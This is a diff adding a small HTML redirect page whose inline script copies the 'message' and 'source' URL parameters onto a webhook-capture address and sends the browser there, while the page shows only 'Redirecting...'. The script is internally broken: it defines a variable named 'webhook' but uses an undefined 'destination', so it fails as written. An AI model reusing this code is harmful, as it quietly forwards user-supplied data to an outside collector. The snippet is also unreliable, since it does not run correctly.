@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8");
+    const params = new URLSearchParams(window.location.search);
+    for (const key of ["message", "source"]) {
+      if (params.has(key)) {
+        destination.searchParams.set(key, params.get(key));
+      }
+    }
+
+    window.location.replace(destination.href);
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
